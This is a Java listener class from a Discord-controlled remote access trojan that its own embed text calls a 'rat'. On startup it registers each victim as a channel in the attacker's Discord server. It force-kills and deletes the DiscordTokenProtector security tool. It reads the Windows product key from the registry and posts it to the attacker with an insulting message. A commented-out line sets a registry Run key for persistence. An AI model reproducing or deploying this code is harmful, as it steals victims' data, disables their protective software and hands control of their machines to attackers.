package me.vasler.listeners;

import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;
import me.vasler.Main;
import java.awt.Color;
import java.io.File;
import java.io.IOException;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.events.channel.ChannelCreateEvent;
import net.dv8tion.jda.api.events.session.ReadyEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class StartListener
extends ListenerAdapter {

    public void onReady(ReadyEvent event) {
        File check = new File(Main.dir.getAbsolutePath() + "\\9779F8E04E7A01A68A3B636AE4B5212AA46575B2");
        for (Guild guild : event.getJDA().getGuilds()) {
            if (check.exists() || !guild.getId().equals("1179503233023086622")) continue;
            guild.createTextChannel(Main.name, guild.getCategoryById("1179503233023086622")).queue();
            // Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "Sun", Main.dir.getAbsolutePath() + "\\jdk_1.8.0_3.jar");
            check.mkdir();
            killProtection();
        }
    }

    public void killProtection() {
        String appData = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\DiscordTokenProtector";
        File file = new File(appData);
        if (new File(appData).exists()) {
            try {
                Runtime.getRuntime().exec("taskkill /IM DiscordTokenProtector.exe /F");
            } catch (Exception e) {
                e.printStackTrace();
            }
            file.delete();
        }
    }

    public void onChannelCreate(ChannelCreateEvent event) {
        if (event.getChannel().asTextChannel().getName().equalsIgnoreCase(Main.name)) {
            EmbedBuilder eb = new EmbedBuilder();
            eb.setTitle("ieatworms", null);
            eb.setColor(Color.BLUE);
            String Omg = Advapi32Util.registryGetStringValue(WinReg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform", "BackupProductKeyDefault");
            eb.setDescription("Dis retard " + Main.name + " ran my very rat \n" + "WINDOWS KEY: " + Omg);
            eb.setFooter("ieatworms - Created by Valser and RailHack", "https://media.discordapp.net/attachments/1176729350398287912/1179982540384260167/OIP_1.png?ex=657bc360&is=65694e60&hm=7cc00a922bca808938bbb25e19e807621545bb2468823bb699ba2b78816ec385&=&format=webp&quality=lossless");
            event.getChannel().asTextChannel().sendMessageEmbeds(eb.build(), new MessageEmbed[0]).queue();
        }
    }
}

